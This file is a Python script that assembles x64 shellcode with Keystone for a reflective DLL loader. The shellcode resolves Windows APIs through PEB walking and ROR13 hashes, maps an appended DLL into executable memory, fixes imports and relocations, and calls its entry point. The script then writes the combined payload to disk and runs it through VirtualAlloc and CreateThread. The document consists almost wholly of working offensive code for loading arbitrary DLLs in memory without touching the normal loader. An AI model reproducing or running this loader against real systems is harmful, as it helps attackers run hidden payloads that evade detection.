import ctypes, struct
from keystone import *
CODE = (
    "start:                              "
    "   int3                            ;"
    "   push rbp                        ;"
    "   mov rbp, rsp                    ;"
    "   add rsp, 0xfffffffffffffdf8     ;"  # Make some space in stack
    #STEP 0 : calculate dll images current base address
    "find_dllstart:                       "
    "   lea rsi, [rip+dll_base]         ;"  # Trying to get address of end of this shellcode
    "   mov rax, 0x5a4d                 ;"
    "dll_compare:                        "
    "   inc rsi                         ;"  # Increment the loop counter
    "   mov rdi, rsi                    ;"
    "   scasw                           ;"  # compares the content of the AX register to the word addressed by DI
    "   jne dll_compare                 ;"
    "dll_base_found:                     "
    "   mov r12, rsi                    ;"  # R12 has DLL base address
    #STEP 1 : process the kernels exports for the functions our loader needs...
    "find_ntdll:                         "
    "   xor rcx, rcx                    ;"  # Zeroing RCX content
    "   mov rax, gs:[rcx+0x60]          ;"  # 0x060 ProcessEnvironmentBlock to RAX
    "   mov rax, [rax+0x18]             ;"  # 0x18 ProcessEnvironmentBlock.Ldr Offset
    "   mov rsi, [rax+0x20]             ;"  # 0x20 ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
    "   mov rax, [rsi]                  ;"  # Load qword at address (R)SI into RAX
    "   mov r13, [rax+0x20]             ;"  # R13 = NTDLL base address
    "find_kernel32:                      "
    "   xchg rax, rsi                   ;"  # Swap RAX,RSI
    "   lodsq                           ;"  # Load qword at address (R)SI into RAX
    "   mov r14, [rax + 0x20]           ;"  # R14 = KERNEL32 base address
    "find_function_shorten:              "
    "   jmp find_function_shorten_bnc   ;"
    "find_function_ret:                  "
    "   pop rsi                         ;"
    "   mov [rbp+0x08], rsi             ;"
    "   jmp resolve_symbols_kernel32    ;"
    "find_function_shorten_bnc:          "
    "   call find_function_ret          ;"
    "find_function:                      "
    "   push rbp                        ;"
    "   mov rbp, rsp                    ;"
    "   sub rsp, 0x30                   ;"
    "   push rbx                        ;"
    "   mov r8, rbx                     ;"  # Copy Kernel32 base address to R8 register
    "   mov ebx, [rbx + 0x3C]           ;"  # Get Kernel32 PE Signature (offset 0x3C) into EBX
    "   add rbx, r8                     ;"  # Add defrerenced signature offset to kernel32 base. Store in RBX.
    "   xor r9, r9                      ;"  # Offset from PE32 Signature to Export Address Table
    "   add r9, 0x88FFFFF               ;"  # |
    "   shr r9, 0x14                    ;"  # |
    "   mov edx, [rbx+r9]               ;"  # Offset from PE32 Signature to Export Address Table
    "   add rdx, r8                     ;"  # RDX = kernel32.dll + RVA ExportTable = ExportTable Address
    "   mov r10d, [rdx + 0x14]          ;"  # Number of functions
    "   xor r11, r11                    ;"  # Zero R11 before use
    "   mov r11d, [rdx+0x20]            ;"  # AddressOfNames RVA
    "   add r11, r8                     ;"  # AddressOfNames VMA
    "   mov rdi, r10                    ;"  # Set loop counter
    "find_function_loop:                 "
    "   jecxz find_function_finished    ;"  # Jump to the end if RCX is 0
    "   dec rdi                         ;"  # Decrement our loop by one
    "   xor rsi, rsi                    ;"  # Zero RSI for use
    "   mov esi, [r11+rdi*4]            ;"  # ESI = RVA for first AddressOfName
    "   add rsi, r8                     ;"  # RSI = Function name VMA
    "compute_hash:                       "
    "   xor eax, eax                    ;"  # NULL EAX
    "   xor r15, r15                    ;"  # NULL r15
    "   cld                             ;"  # Clear direction
    "compute_hash_again:                 "
    "   lodsb                           ;"  # Load the next byte from rsi into al
    "   test al, al                     ;"  # Check for NULL terminator
    "   jz compute_hash_finished        ;"  # If the ZF is set, we've hit the NULL term
    "   ror r15d, 0x0d                  ;"  # Rotate edx 13 bits to the right
    "   add r15d, eax                   ;"  # Add the new byte to the accumulator
    "   jmp compute_hash_again          ;"
    "compute_hash_finished:              "
    "find_function_compare:              "
    "   cmp r15, rcx                    ;"  # Compare the computed hash with the requested hash
    "   jnz find_function_loop          ;"
    "   xor r11, r11                    ;"
    "   mov r11d, [rdx + 0x24]          ;"  # AddressOfNameOrdinals RVA
    "   add r11, r8                     ;"  # AddressOfNameOrdinals VMA
    "   xor r15, r15                    ;"
    "   mov r15w, [r11+rdi*2]           ;"  # AddressOfNameOrdinals + Counter. RCX = counter
    "   xor r11, r11                    ;"  
    "   mov r11d, [rdx + 0x1c]          ;"  # AddressOfFunctions RVA
    "   add r11, r8                     ;"  # AddressOfFunctions VMA
    "   mov eax, [r11+r15*4]            ;"  # Get the function RVA
    "   add rax, r8                     ;"  # Get the function VMA
    "   mov r14, rax                    ;"  # Preserve function address in R14
    "find_function_finished:             "
    "   pop rbx                         ;"
    "   add rsp, 0x30                   ;"
    "   pop rbp                         ;"
    "   ret                             ;"
    "resolve_symbols_kernel32:           "
    "   mov rbx, r14                    ;"  # Moving Kernel32 base address to RBX
    #"   push qword 0x78b5b983           ;"  # TerminateProcess hash
    "   mov ecx, 0x78b5b983             ;"
    "   call qword ptr [rbp+0x08]       ;"  # Call find_function
    "   mov [rbp+0x20], rax             ;"  # Save TerminateProcess address
    #"   xor rax, rax                    ;"  # Same as push imm64, due to keystone error,
    #"   mov eax, 0xec0e4e8e             ;"  # we are moving value to a register
    #"   push rax                        ;"  # and then push to stack
    "   mov ecx, 0xec0e4e8e             ;"
    "   call qword ptr [rbp+0x08]       ;"  # Call find_function
    "   mov [rbp+0x28], rax             ;"  # Save LoadLibraryA address for later usage
    #"   xor rax, rax                    ;"  # Same as push imm64, due to keystone error,
    #"   mov eax, 0x7c0dfcaa             ;"  # we are moving value to a register
    #"   push rax                        ;"  # and then push to stack
    "   mov ecx, 0x7c0dfcaa             ;"
    "   call qword ptr [rbp+0x08]       ;"  # Call find_function
    "   mov [rbp+0x38], rax             ;"  # Save GetProcAddress address for later usage
    #"   xor rax, rax                    ;"  # Same as push imm64, due to keystone error,
    #"   mov eax, 0x91afca54             ;"  # we are moving value to a register
    #"   push rax                        ;"  # and then push to stack
    "   mov ecx, 0x91afca54             ;"
    "   call qword ptr [rbp+0x08]       ;"  # Call find_function
    "   mov [rbp+0x40], rax             ;"  # Save VirtualAlloc address for later usage
    "resolve_symbols_ntdll:              "
    "   mov rbx, r13                    ;"  # Moving Ntdll base address to RBX
    #"   xor rax, rax                    ;"  # Same as push imm64, due to keystone error,
    #"   mov eax, 0x534c0ab8             ;"  # we are moving value to a register
    #"   push rax                        ;"  # and then push to stack
    "   mov ecx, 0x534c0ab8             ;"
    "   call qword ptr [rbp+0x08]       ;"  # Call find_function
    "   mov [rbp+0x48], rax             ;"  # Save NtFlushInstructionCache address for later usage
    #STEP 2 : load our image into a new permanent location in memory...
    "   mov ebx, [r12 + 0x3c]           ;"  # Get and add offset to NT Header (e_lfanew)
    "   add ebx, 0x18                   ;"  # Add offset to Optional header
    "   add rbx, r12                    ;"  # VA of the Optional Header for the PE to be loaded
    "   mov rdi, rbx                    ;"  # RDI = Optional Header value
    "call_virtual_alloc:                 "
    "   mov rcx, 0                      ;"  # RCX = NULL (first argument)
    "   xor rdx, rdx                    ;"  # Clear rdx
    "   mov edx, [rdi + 0x38]           ;"  # RDX = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage (second argument)
    "   mov r8d, 0x1000                 ;"  # R8D = MEM_RESERVE
    "   or r8d, 0x2000                  ;"  # R8D |= MEM_COMMIT (third argument)
    "   mov r9d, 0x40                   ;"  # R9D = PAGE_EXECUTE_READWRITE (fourth argument)
    "   call qword ptr [rbp+0x40]       ;"  # Call VirtualAlloc
    "   mov ecx, [rdi + 0x3c]           ;"  # ECX = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders
    "   mov rdi, rax                    ;"  # RDI = BaseAddress of allocated memory
    "   mov r13, rax                    ;"  # R13 = Preserve baseaddress of allocated memory
    "   mov rsi, r12                    ;"  # Move DLL base address to RSI
    "copy_headers:                       "    
    "   test ecx, ecx                   ;"  # Check if ECX is 0
    "   jz done_copy                    ;"  # If zero, exit loop
    "   mov al, [rsi]                   ;"  # Load byte from [RSI] (uiLibraryAddress)
    "   mov [rdi], al                   ;"  # Store byte to [RDI] (uiBaseAddress)
    "   inc rsi                         ;"  # Increment source pointer
    "   inc rdi                         ;"  # Increment destination pointer
    "   dec ecx                         ;"  # Decrement counter (uiValueA)
    "   jmp copy_headers                ;"  # Repeat loop
    "done_copy:                          "
    #STEP 3: load in all sections
    "   mov rax, rbx                    ;"  # RAX = Optional Header value
    "   sub rbx, 0x18                   ;"  # RBX = NT Header value
    "   add rbx, 0x4                    ;"  # RBX = File Header
    "   add ax, [rbx + 0x10]            ;"  # RAX = Optional Header value + File Header -> Size of optional header = RVA of next section
    "   mov r8, rax                     ;"  # R8 = uiValueA = VA of first  section
    "   mov cx, [rbx + 0x2]             ;"  # RCX= File Header -> Number of sections
    "iterate_sections:                   "
    "   test ecx, ecx                   ;"
    "   jz sections_done                ;"
    "   mov rax, r13                    ;"  # RAX = Base address, Calculating uiValueB
    "   mov ebx, [r8 + 0xc]             ;"  # [0xc=12] RAX = uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress
    "   add rax, rbx                    ;"
    "   mov r9, rax                     ;"  # R9 = uiValueB
    "   mov rax, r12                    ;"  # RAX = uiLibraryAddress, Caluculating uiValueC
    "   mov ebx, [r8 + 0x14]            ;"  # [0x14=20] RAX = uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData
    "   add rax, rbx                    ;"
    "   mov r10, rax                    ;"  # R10 = uiValueC
    "   mov edx, [r8 + 0x10]            ;"  # [0x10=16] EDX = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData
    "copy_section:                       "
    "   test edx, edx                   ;"
    "   jz next_section                 ;"
    "   mov al, [r10]                   ;"  # al = *(BYTE *)uiValueC
    "   mov [r9], al                    ;"  # *(BYTE *)uiValueB = al
    "   inc r10                         ;"  # uiValueC++
    "   inc r9                          ;"  # uiValueB++
    "   dec edx                         ;"  # uiValueD--
    "   jmp copy_section                ;"
    "next_section:                       "
    "   add r8, 0x28                    ;"  # [40 = 0x28] uiValueA += sizeof(IMAGE_SECTION_HEADER)
    "   dec ecx                         ;"
    "   jmp iterate_sections            ;"
    "sections_done:                      "
    #STEP 4: process images import table.
    "   lea rax, [r12+0x80+0x18+0x70+0x8];" # uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
    "   mov [rbp+0x50], rax             ;"  # Store for future use
    "   mov eax, [rax]                  ;"  # (PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress
    "   add rax, r13                    ;"  # uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress)
    "   mov [rbp+0x58], rax             ;"  # Store for future use
    "process_imports:                    "
    "   mov rax, [rbp+0x58]             ;"  # uiValueC
    "   mov eax, [rax+0xc]              ;"  # Name RVA = (PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name
    "   test eax, eax                   ;"  
    "   jz end_process_imports          ;"
    "   add rax, r13                    ;"  # Name VMA, Starting to prepare vars for LoadLibrary() call.
    "   mov rcx, rax                    ;"  # Param: DLL name to load.
    "   call qword ptr [rbp+0x28]       ;"  # call LoadLibraryA()
    "   mov [rbp+0x60], rax             ;"  # Store address value of loaded library
    "   mov rax, [rbp+0x58]             ;"  # getting uiValueC for calculating uiValueD
    "   mov ebx, [rax+0x0]              ;"  # PIMAGE_IMPORT_DESCRIPTOR -> OriginalFirstThunk
    "   add rbx, r13                    ;"  # uiValueD
    "   mov [rbp+0x68], rbx             ;"  # Store for future use
    "   mov eax, [rax+0x10]             ;"  # PIMAGE_IMPORT_DESCRIPTOR -> FirstThunk
    "   add rax, r13                    ;"  # uiValueA
    "   mov [rbp+0x70], rax             ;"  # Store for future use
    "process_functions:                  "
    "   mov rax, [rbp+0x70]             ;"  # uiValueA
    "   mov rax, [rax]                  ;"  # DEREF(uiValueA)
    "   test rax, rax                   ;"
    "   jz end_process_functions        ;"
    "   mov rax, [rbp+0x68]             ;"  # Starting sanity check uiValueD as some compilers only import by FirstThunk
    "   test rax, rax                   ;"
    "   jz import_by_name               ;"
    "   mov rax, [rax]                  ;"
    "   mov r8, 0x8000000000000000      ;"
    "   and rax, r8                     ;"
    "   jz import_by_name               ;"
    "import_by_ordinal:                  "
    "   jmp next_function               ;"
    "import_by_name:                     "
    "   mov rax, [rbp+0x70]             ;"  # uiValueA
    "   mov rax, [rax]                  ;"  # RVA of Name Table
    "   add rax, r13                    ;"  # uiValueB = VA of this functions import by name struct
    "   mov rcx, [rbp+0x60]             ;"  # Param1: Loaded library address; Preparing params for GetProcAddress
    "   mov rdx, rax                    ;"  # Param2: uiValueB = Function name
    "   add rdx, 0x2                    ;"  # Name at offset 0x2
    #"   add rsp, 0x8                    ;"  # Make some adjustment on the stack
    "   call qword ptr [rbp+0x38]       ;"  # call GetProcAddress
    #"   sub rsp, 0x8                    ;"  # Get back the stack space
    "   mov rcx, [rbp+0x70]             ;"  # uiValueA
    "   mov [rcx], rax                  ;"  # Updates the Thunk address
    "next_function:                      "
    "   add qword ptr [rbp+0x70], 0x8   ;"  # Moving to next function, uiValueA + 0x8, Size of a pointer
    "   mov rax, [rbp+0x68]             ;"  # uiValueD
    "   test rax, rax                   ;"  # checking uiValueD
    "   jz skip_valueD                  ;"
    "   add qword ptr [rbp+0x68], 0x8   ;"  # uiValueD + 0x8, size of a pointer
    "skip_valueD:                        "
    "   jmp process_functions           ;"
    "end_process_functions:              "
    "   add qword ptr [rbp+0x58], 0x14  ;"  # adding 20=0x14, Size of Import Directory Table
    "   jmp process_imports             ;"
    "end_process_imports:                "
    #STEP 5: process images relocations. 
    "   mov rax, r13                    ;"  # uiBaseAddress value 
    "   mov rbx, [r12+0x80+0x18+0x18]   ;"  # ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase (0x18 offset from optional header) 
    "   sub rax, rbx                    ;"  # Base address delta to perform relocations (even if we load at desired image base)  
    "   mov [rbp+0x50], rax             ;"  # uiLibraryAddress 
    "   lea rax, [r12+0x108+0x28]       ;"  # (5*8=40=0x28)uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC] 
    "   mov [rbp+0x58], rax             ;"  # uiValueB, store for future use 
    "process_reloc:                      " 
    "   mov rax, [rbp+0x58]             ;" 
    "   mov eax, [rax+0x4]              ;"  # (PIMAGE_DATA_DIRECTORY)uiValueB)->Size 
    "   test rax, rax                   ;" 
    "   jz end_process_reloc            ;" 
    "   mov rax, [rbp+0x58]             ;"  
    "   mov eax, [rax]                  ;"  # (PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress 
    "   add rax, r13                    ;"  # uiValueC is now the first entry (IMAGE_BASE_RELOCATION) 
    "   mov [rbp+0x60], rax             ;"  # uiValueC, store for future use 
    "iterate_blocks:                     " 
    "   mov rax, [rbp+0x60]             ;" 
    "   mov eax, [rax+0x4]              ;"  # (PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock 
    "   test eax, eax                   ;" 
    "   jz end_process_reloc            ;" 
    "   mov rbx, [rbp+0x60]             ;" 
    "   mov ebx, [rbx]                  ;"  # ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress 
    "   add rbx, r13                    ;"  # uiValueA = the VA for this relocation block 
    "   mov [rbp+0x68], rbx             ;"  # uiValueA, store for future use 
    "   sub eax, 0x8                    ;"  # (PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) 
    "   mov ecx, 0x2                    ;"  # sizeof(IMAGE_RELOC) 
    "   xor edx, edx                    ;" 
    "   div ecx                         ;"  # EAX(Quotient) = uiValueB = EAX / sizeof(IMAGE_RELOC) = number of entries in this relocation block 
    "   mov rdx, [rbp+0x60]             ;"  # uiValueC 
    "   add rdx, 0x8                    ;"  # uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION) = the first entry in the current relocation block 
    "iterate_entries:                    " 
    "   test eax, eax                   ;"  # test uiValueB 
    "   jz next_reloc_block             ;" 
    "   movzx rcx, word ptr [rdx]       ;"  # Load the 16-bit IMAGE_RELOC entry 
    "   shr rcx, 12                     ;"  # Shift right to isolate the 4-bit Type field 
    "   and rcx, 0xF                    ;"  # Mask out any extraneous bits     
    "   cmp rcx, 0XA                    ;"  # IMAGE_REL_BASED_DIR64 
    "   je relocate_dir64               ;" 
    "   cmp rcx, 0x3                    ;"  # IMAGE_REL_BASED_HIGHLOW 
    "   je relocate_highlow             ;" 
    "   cmp rcx, 0x1                    ;"  # IMAGE_REL_BASED_HIGH 
    "   je relocate_high                ;"   
    "   cmp rcx, 0x2                    ;"  # IMAGE_REL_BASED_LOW 
    "   je relocate_low                 ;" 
    "   jmp next_entry                  ;" 
    "relocate_dir64:                     " 
    "   movzx rcx, word ptr [rdx]       ;"  # Load the 16-bit IMAGE_RELOC entry 
    "   and rcx, 0xFFF                  ;"  # Relocation Offset, (PIMAGE_RELOC)uiValueD)->offset 
    "   mov r8, [rbp+0x68]              ;"  # uiValueA 
    "   add r8, rcx                     ;"  # (uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) 
    "   mov rbx, [r8]                   ;"  # Relocation to be applied 
    "   add rbx, [rbp+0x50]             ;"  # + uiLibraryAddress 
    "   mov [r8], rbx                   ;" 
    "   jmp next_entry                  ;"    
    "relocate_highlow:                   "
    "   movzx rcx, word ptr [rdx]       ;"  # Load the 16-bit IMAGE_RELOC entry 
    "   and rcx, 0xFFF                  ;"  # Relocation Offset, (PIMAGE_RELOC)uiValueD)->offset 
    "   mov r8, [rbp+0x68]              ;"  # uiValueA 
    "   add r8, rcx                     ;"  # (uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) 
    "   mov rbx, [r8]                   ;"  # Relocation to be applied 
    "   add ebx, [rbp+0x50]             ;"  # + uiLibraryAddress 
    "   mov [r8], rbx                   ;" 
    "   jmp next_entry                  ;" 
    "relocate_high:                      " 
    "   movzx rcx, word ptr [rdx]       ;"  # Load the 16-bit IMAGE_RELOC entry 
    "   and rcx, 0xFFF                  ;"  # Relocation Offset, (PIMAGE_RELOC)uiValueD)->offset 
    "   mov r8, [rbp+0x68]              ;"  # uiValueA 
    "   add r8, rcx                     ;"  # (uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) 
    "   mov rbx, [r8]                   ;"  # Relocation to be applied 
    "   add bh, [rbp+0x50]              ;"  # + uiLibraryAddress 
    "   mov [r8], rbx                   ;" 
    "   jmp next_entry                  ;" 
    "relocate_low:                       " 
    "   movzx rcx, word ptr [rdx]       ;"  # Load the 16-bit IMAGE_RELOC entry 
    "   and rcx, 0xFFF                  ;"  # Relocation Offset, (PIMAGE_RELOC)uiValueD)->offset 
    "   mov r8, [rbp+0x68]              ;"  # uiValueA 
    "   add r8, rcx                     ;"  # (uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) 
    "   mov rbx, [r8]                   ;"  # Relocation to be applied 
    "   add bl, [rbp+0x50]              ;"  # + uiLibraryAddress 
    "   mov [r8], rbx                   ;" 
    "   jmp next_entry                  ;" 
    "next_entry:                         " 
    "   add rdx, 0x2                    ;"  # uiValueD += sizeof( IMAGE_RELOC )
    "   dec eax                         ;" 
    "   jmp iterate_entries             ;"     
    "next_reloc_block:                   " 
    "   mov r9, [rbp+0x60]              ;"  # uiValueC 
    "   mov r9d, [r9+0x4]               ;"  # (PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock 
    "   add qword ptr [rbp+0x60], r9    ;"  # get the next entry in the relocation directory 
    "   jmp iterate_blocks              ;" 
    "end_process_reloc:                  " 
    #STEP 6: call images entry point 
    "   xor rbx, rbx                    ;" 
    "   mov bx, [r12+0x80+0x18+0x10]    ;"  # ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint (0x10 offset from optional header) 
    "   add rbx, r13                    ;"  # uiValueA = AddressOfEntryPoint + uiBaseAddress 
    "   mov rcx, 0xffffffffffffffff     ;"  # Param 1 : (HANDLE)-1 
    "   xor rdx, rdx                    ;"  # Param 2 : NULL 
    "   xor r8, r8                      ;"  # Param 3 : 0 
    "   call qword ptr [rbp+0x48]       ;"  # call pNtFlushInstructionCache 
    "   mov rcx, r13                    ;"  # Param 1 : uiBaseAddress 
    "   mov rdx, 0x1                    ;"  # Param 2 : DLL_PROCESS_ATTACH 
    "   xor r8, r8                      ;"  # Param 3 : NULL 
    #"   sub rsp, 0x20                   ;"  # Make some adjustment on the stack 
    "   call rbx                        ;"  # Call the entry point 
    #"   add rsp, 0x20                   ;" 
    "exit_shellcode:                     " 
    "   mov rcx, 0xffffffffffffffff     ;" 
    "   xor rdx, rdx                    ;" 
    "   call qword ptr [rbp+0x20]       ;"  
    "dll_base:                           " 
    "   nop                             ;" 
 )

ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)
sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)
print(shellcode)
# Write the (shellcode+target_dll) to a file for later use
with open("target.dll", "rb") as dll_file:  
   with open("shellcode.sh", "wb") as binary_file:
        shellcode += dll_file.read()
        binary_file.write(shellcode)
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
ctypes.windll.kernel32.RtlCopyMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
ctypes.windll.kernel32.CreateThread.argtypes = (ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int))
space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
buff = ( ctypes.c_char * len(shellcode) ).from_buffer_copy( shellcode )
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
print("Shellcode located at address %s" % hex(space))
input("...ENTER TO EXECUTE SHELLCODE...")
handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(handle, -1);